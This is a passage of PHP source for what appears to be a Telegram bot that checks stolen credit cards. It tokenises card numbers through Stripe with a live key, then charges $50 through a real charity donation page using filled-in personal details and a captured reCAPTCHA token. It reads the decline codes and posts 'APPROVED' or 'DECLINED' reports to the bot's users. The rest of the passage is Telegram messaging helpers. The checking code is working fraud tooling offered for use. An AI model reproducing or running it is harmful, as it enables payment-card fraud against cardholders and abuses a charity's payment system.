curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$result = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=50&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
$result1 = curl_exec($ch);
curl_close($ch);
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);

$data = json_decode($result1, true);
	
//------------------------------------------------------------------//
$cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
$decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
//------------------------------------------------------------------//
if($cvc_check == false){
$proxy = "LIVE ✅";
}else{
$proxy = "PROXY DEAD ❌";
}

////////////////////////// [Card Response]  //////////////////////////
//$respo = trim(strip_tags(capture($result1,'"message":"',';')));
$respo = $data['status'] ?? trim(strip_tags(capture($result1,'"message":"',';')));
	
$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($result1, $live_array)) {
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = True;
            }elseif((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: INCORRECT ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: EXPIRED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, 'Incomplete or incorrect payment information.'))){
		$respo = trim(strip_tags(capture($result1,'"message":"','"')));
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.')) || (strpos($result1, "do_not_honor")) || (strpos($result1, '"decline_code": "generic_decline"')) || (strpos($result1, "generic_decline")) || (strpos($result1, "Your card does not support this type of purchase")) || (strpos($result1, "card_error_authentication_required"))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
                $live = False;
            }elseif((strpos($result1, '"cvc_check": "unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: CVC CHECK UNAVAILABLE ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }elseif(strpos($result1, 'null')){
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }else{
                $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($50)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
                $live = False;
            }
if($live) {
editMessage($chat_id, $respuesta, $id_text);
die();
} else {
editMessage($chat_id, $respuesta, $id_text);
die();
}
//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();
}



//-------------------END CHECKER CCS------------------//
//else if(isset($message)){
/*
elseif ((strpos($message, "!") === 0 && strlen($message) > 1) || (strpos($message, "/") === 0 && strlen($message) > 1) || (strpos($message, ".") === 0 && strlen($message) > 1)) {
        $respuesta = "Perdón no te entiendo!!!";
        sendMessage($chat_id,$respuesta,$message_id);
}
*/

elseif (preg_match('/^[\/!\.]\w+/', $message)) {
    // Si el mensaje comienza con /, ! o . seguido de alguna palabra
    $respuesta = "Perdón no te entiendo!!!";
   // sendMessage($chat_id,$respuesta,$message_id);
   // echo "$respuesta";
} else {
    // Ignorar mensajes que no son comandos
}

//-------FUNCION DE ENVIAR---------//
function sendMessage($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&reply_to_message_id=".$message_id."&parse_mode=HTML&text=".urlencode($respuesta);
//$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
$cap_message_id = file_get_contents($url);
//------------EXTRAE EL ID DEL MENSAGE----------//
$id_cap = capture($cap_message_id, '"message_id":', ',');
file_put_contents("ID", $id_cap);
}

function sendMessageNew($chatID, $respuesta, $message_id) {
$url = $GLOBALS["website"]."/sendMessage?disable_web_page_preview=true&chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}

function sendPv($chatID, $respuesta) {
     $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&text=".urlencode($respuesta);
    file_get_contents($url);                                    
}


function editMessage($chatID, $respuesta, $id_text){
$url = $GLOBALS["website"]."/editMessageText?disable_web_page_preview=true&chat_id=".$chatID."&message_id=".$id_text."&parse_mode=HTML&text=".urlencode($respuesta);
file_get_contents($url);
}


//------------------------------//

function deleteMessage($chatID, $message_id){
$url = $GLOBALS["website"]."/deleteMessage?chat_id=".$chatID."&message_id=".$message_id."";
file_get_contents($url);
}

function kickChatMember($chatID, $id){
$url = $GLOBALS["website"]."/kickChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}

function unbanChatMember($chatID, $id){
$url = $GLOBALS["website"]."/unbanChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}

function sendPhoto($chatID, $photoID, $description = '', $message_id = null) {
     $url = $GLOBALS["website"] . "/sendPhoto";

    // Inicializa cURL
    $ch = curl_init();                                          
    // Configura los datos a enviar
    $data = [
	 'chat_id' => $chatID,
        'photo' => $photoID,
        'caption' => $description,
        'parse_mode' => 'HTML',
    ];

    // Añade el ID del mensaje si se proporciona
    if ($message_id) {
        $data['reply_to_message_id'] = $message_id;
    }

    // Configura cURL para enviar una solicitud POST
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecuta la solicitud
    $response = curl_exec($ch);

    // Cierra cURL
    curl_close($ch);

    return $response; // Puedes manejar la respuesta según lo necesites
 }



function sendRefes($chat_id_2, $file_id, $descripcion) {
    $url = $GLOBALS["website"] . "/sendPhoto";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, array(
        'chat_id' => $chat_id_2,
        'photo' => $file_id,
        'caption' => $descripcion,
        'parse_mode' => 'HTML'
    ));
    $response = curl_exec($ch);
    curl_close($ch);
    $response = json_decode($response, true);
    if ($response['ok'] == true) {
        $respuesta = "Sent successfully \n";
    } else {
        echo "Error al enviar el mensaje al canal $chat_id\n";
    }

}






/*
function sendMessage($chatID, $respuesta) {
        $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
        file_get_contents($url);
}
*/


?>
